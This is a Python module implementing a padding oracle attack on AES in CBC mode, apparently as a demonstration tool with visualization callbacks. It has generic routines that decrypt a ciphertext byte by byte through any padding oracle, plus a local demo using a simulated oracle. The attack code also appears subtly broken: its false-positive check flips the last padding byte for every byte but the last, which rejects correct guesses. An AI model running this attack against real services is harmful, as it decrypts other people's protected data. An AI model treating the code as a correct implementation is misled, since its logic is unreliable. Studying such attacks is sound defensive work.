"""
AES-CBC Padding Oracle Attack Implementation

Implements a padding oracle attack against AES in CBC mode.
Based on both practical implementations by:
- Original implementation in the project
- Reference implementation by Panos Sakkos
"""

import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

def recover_block(prev_block, curr_block, oracle, block_size=16, callback=None):
    """
    Recover a single block of plaintext using the padding oracle attack.
    
    Args:
        prev_block (bytes): Previous ciphertext block (or IV for first block)
        curr_block (bytes): Current ciphertext block to decrypt
        oracle (function): Padding oracle function
        block_size (int): Block size in bytes
        callback (function): Optional callback for visualization
        
    Returns:
        bytes: Recovered plaintext for this block
    """
    intermediate = bytearray(block_size)
    plaintext = bytearray(block_size)
    
    for i in range(block_size - 1, -1, -1):
        padding_value = block_size - i
        
        if callback:
            callback(None, i, None, None, "byte_start", 
                    f"Attempting to recover byte {block_size - i} using padding {padding_value}")
        
        # Set up padding bytes we already know
        test_block = bytearray(prev_block)
        for j in range(i + 1, block_size):
            test_block[j] ^= intermediate[j] ^ padding_value
        
        found = False
        for test_byte in range(256):
            test_block[i] = prev_block[i] ^ test_byte ^ padding_value
            
            if callback:
                progress = (test_byte / 256) * 100
                callback(None, i, None, None, "testing", f"Testing value {test_byte:02x}", progress)
            
            if oracle(bytes(test_block) + curr_block):
                # Verify it's not a false positive by changing another padding byte
                if i < block_size - 1:
                    verify_block = test_block[:]
                    verify_block[-1] ^= 1  # Change last padding byte
                    if not oracle(bytes(verify_block) + curr_block):
                        continue  # False positive
                
                intermediate[i] = test_byte ^ padding_value
                plaintext[i] = intermediate[i] ^ prev_block[i]
                found = True
                
                if callback:
                    callback(None, i, plaintext[i], intermediate[i], "found",
                           f"Found byte {block_size - i}: {chr(plaintext[i]) if 32 <= plaintext[i] <= 126 else '?'}")
                break
        
        if not found:
            if callback:
                callback(None, i, None, None, "failed", f"Failed to find byte {block_size - i}")
            return None
            
    return bytes(plaintext)

def aes_attack(ciphertext, oracle, iv, block_size=16, visual_callback=None):
    """
    Perform an AES-CBC padding oracle attack to decrypt ciphertext.
    
    Args:
        ciphertext (bytes): The ciphertext to decrypt
        oracle (function): A padding oracle function that returns True for valid padding
        iv (bytes): The initialization vector
        block_size (int): AES block size (default 16 bytes)
        visual_callback (function): Optional callback for visualization
        
    Returns:
        bytes: The decrypted plaintext, or None if the attack fails
    """
    if not isinstance(ciphertext, bytes) or not isinstance(iv, bytes):
        raise TypeError("Ciphertext and IV must be bytes objects")
    if len(ciphertext) % block_size != 0:
        raise ValueError("Ciphertext length must be a multiple of the block size")
    if len(iv) != block_size:
        raise ValueError(f"IV must be {block_size} bytes")
    
    blocks = [iv] + [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    recovered = bytearray()
    
    for block_idx in range(len(blocks) - 1):
        if visual_callback:
            visual_callback(block_idx, None, None, None, "block_start",
                          f"Starting attack on block {block_idx + 1}/{len(blocks)-1}")
        
        plaintext_block = recover_block(blocks[block_idx], blocks[block_idx + 1], 
                                      oracle, block_size, visual_callback)
        if plaintext_block is None:
            return None
            
        recovered.extend(plaintext_block)
        
        if visual_callback:
            visual_callback(block_idx, None, plaintext_block, None, "block_complete",
                          f"Completed block {block_idx + 1}: {plaintext_block.decode('ascii', errors='replace')}")
    
    try:
        result = unpad(recovered, block_size)
        if visual_callback:
            visual_callback(None, None, result, None, "complete",
                          f"Attack complete! Recovered {len(result)} bytes")
        return result
    except ValueError:
        if visual_callback:
            visual_callback(None, None, None, None, "padding_error",
                          "Failed to remove padding - recovered data may be corrupted")
        return None

def demonstrate_aes_attack(plaintext_bytes, block_size=16, visual_callback=None):
    """
    Demonstrate the AES-CBC padding oracle attack using a sample plaintext.
    
    Args:
        plaintext_bytes (bytes): Sample plaintext to encrypt
        block_size (int): AES block size
        visual_callback (function): Optional callback for visualization
        
    Returns:
        tuple: (original, recovered, encryption time, attack time)
    """
    key = get_random_bytes(block_size)
    iv = get_random_bytes(block_size)
    
    if visual_callback:
        visual_callback(None, None, None, None, "setup",
                      "Setting up demonstration with random key and IV")
    
    encrypt_start = time.time()
    padded_data = pad(plaintext_bytes, block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(padded_data)
    encrypt_time = time.time() - encrypt_start
    
    if visual_callback:
        visual_callback(None, None, None, None, "encrypted",
                      f"Original text encrypted into {len(ciphertext)} bytes")
    
    def padding_oracle(test_data):
        try:
            time.sleep(0.01)  # Simulate network delay
            cipher = AES.new(key, AES.MODE_CBC, iv)
            _ = unpad(cipher.decrypt(test_data), block_size)
            return True
        except ValueError:
            return False
    
    attack_start = time.time()
    recovered_plaintext = aes_attack(ciphertext, padding_oracle, iv, block_size, visual_callback)
    attack_time = time.time() - attack_start
    
    return plaintext_bytes, recovered_plaintext, encrypt_time, attack_time
